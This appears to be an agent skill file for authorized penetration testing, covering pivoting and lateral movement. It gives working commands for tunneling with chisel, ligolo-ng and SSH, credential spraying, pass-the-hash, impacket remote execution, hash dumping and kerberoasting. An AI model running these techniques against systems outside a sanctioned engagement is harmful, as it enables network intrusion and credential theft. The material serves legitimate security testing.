---
name: lateral-movement
description: |
  Pivot from a first foothold to deeper in-scope hosts: build tunnels/SOCKS proxies to reach internal networks,
  reuse captured credentials (pass-the-hash / spray / SSH keys), and enumerate/move across hosts. Use after you
  have a shell or credentials and the engagement scope authorizes reaching adjacent internal assets. Covers
  chisel/ligolo-ng/ssh tunneling, netexec/impacket, kerberos, and credential reuse.
tags: [pentest, lateral-movement, pivoting, post-exploitation, ad]
---

# Lateral Movement & Pivoting

Once you own one host, the objective often lives one or two hops away. This skill turns a single foothold into
reach across the authorized internal range. **Only pivot to hosts inside the engagement scope** — never expand to
unlisted subnets/hosts.

All tooling runs on the remote Kali via `kali-arsenal`. Keep interactive pivot processes and reverse shells inside
persistent sessions (`ssh_session_new` / `ssh_session_send` / `ssh_session_read`); catch callbacks with
`ssh_listener_start`.

## 1. Map what the foothold can reach

From the compromised host, enumerate its network position (via your shell in the session):

```bash
ip a; ip route; cat /etc/hosts; arp -a            # linux
ipconfig /all; route print; arp -a                # windows
# fast internal sweep from the foothold (upload a static scanner)
./fscan -h 10.0.0.0/24            # or nmap -sn / for-loop ping if fscan unavailable
```

Record every new host/service with `record_asset` and the routing with `record_relation`
(`Host:foothold --routes_to--> Subnet:10.0.0.0/24`) so `find_attack_path` can chain it.

## 2. Build the pivot (SOCKS into the internal net)

Pick the lightest that works; upload the agent to the foothold, run the server on Kali.

- **ligolo-ng** (preferred, TUN-based, transparent): proxy on Kali, agent on foothold → you get a route to the whole
  internal subnet, then run nmap/nuclei/curl from Kali as if local.
- **chisel**: `chisel server -p 8000 --reverse` on Kali; `chisel client <kali>:8000 R:socks` on foothold → SOCKS5;
  use with `proxychains4` (note: also see `ssh_execute_proxied` / `ATTACK_PROXY_POOL` for egress rotation).
- **ssh -D / -L**: if you have SSH creds on the foothold, dynamic/local forward is the quietest option.

After the SOCKS is up, reach internal hosts:

```bash
proxychains4 -q nmap -sT -Pn -n 10.0.0.5 -p 445,3389,22,80
proxychains4 -q curl -s http://10.0.0.5/
```

(`-sT` full-connect + `-Pn`: SYN/ICMP don't traverse SOCKS.)

## 3. Reuse credentials (don't re-brute what the team already has)

Check the shared `record_asset` credentials/sessions first. Then:

- **netexec (nxc)**: `nxc smb 10.0.0.0/24 -u user -p 'pass'` / `-H <nthash>` (pass-the-hash) → spray captured creds
  across the range, flag `Pwn3d!`. Also `winrm`, `ssh`, `mssql`, `ldap`, `ftp` protocols.
- **impacket**: `psexec.py` / `wmiexec.py` / `smbexec.py` for exec; `secretsdump.py` to dump hashes; `GetUserSPNs.py`
  (kerberoast) / `GetNPUsers.py` (asrep) for AD.
- **SSH keys**: harvested `id_rsa` → try across discovered hosts (same user often reused).
- **Password spraying with lockout awareness**: spray ONE password across many users with a delay, not many
  passwords against one account (avoid lockout). Respect any lockout policy in the rules of engagement.

## 4. Kerberos / AD (when in a domain)

- Enumerate: `nxc ldap`, `bloodhound-python`/SharpHound → import to BloodHound → find shortest path to DA.
- Kerberoast/AS-REP roast → crack offline (`hashcat -m 13100 / -m 18200`).
- Then `find_attack_path` on the shared graph — teammates may already have mapped an edge to the goal.

## 5. Record the chain

Every hop: `record_asset` (new host/cred/session) + `record_relation`
(`Cred:svc@dc --authenticates_to--> Host:dc01`, `Host:web01 --pivots_to--> Host:db01`). This is how scattered
per-solver discoveries become one team-wide kill chain.

## Related skills
- Local root on each hop → `privilege-escalation`
- Exec conventions on controlled hosts → `remote-cmd-execution`
